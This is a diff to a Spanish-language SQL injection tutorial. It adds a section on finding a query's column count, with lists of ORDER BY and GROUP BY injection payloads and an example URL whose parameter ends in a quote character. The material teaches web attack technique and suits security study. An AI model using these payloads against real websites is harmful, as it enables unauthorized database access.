@@ -7,6 +7,7 @@
 * [Tipos de inyección sql](#Tipos-de-inyección-sql)
     * [Inyección sql manual](#Inyección-sql-manual)
       * [Detectar una página vulnerable](#Detectar-una-página-vulnerable)
+      * [Detectar el número de columnas](#Detectar-el-número-de-columnas)
     * [Inyección sql automatizada con sqlmap](#Inyección-sql-automatizada-con-sqlmap)
 
 
@@ -61,6 +62,39 @@ Agregamos un `'` al final del ultimo paramero, pero aquí si nos devuelve un err
 La página nos muestra una leyenda como esta:
 
 `You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax`
+
+Ahora que tenemos el parámetro vulnerable, nos pasamos a lo siguiente.
+
+### Detectar el número de columnas
+
+Ya tenemos el parámetro vulnerable, ahora tenemos que identificar el número de columnas usadas por la página, para esto tenemos los siguientes comandos:
+
+`ordey by` y `group by`
+
+Aquí tenemos que ir testeando el numero de columnas, aquí un ejemplo de como usar el order by y el group by:
+
+```
+1' ORDER BY 1 --+	#
+1' ORDER BY 2 --+	#
+1' ORDER BY 3 --+	#
+1' ORDER BY 4 --+	#
+etc...
+```
+```
+1' GROUP BY 1--+	#
+1' GROUP BY 2--+	#
+1' GROUP BY 3--+	#
+1' GROUP BY 4--+	#
+etc...
+```
+
+
+
+volviendo al ejemplo anterior en donde ya descubrimos el parámetro vulnerable nos quedaria algo como esto:
+
+
+`http://www.paginaparaejemplo.com/algo.php?id=1&id2=1&id3=1'`
+
 
 ## Inyección sql automatizada con sqlmap
 
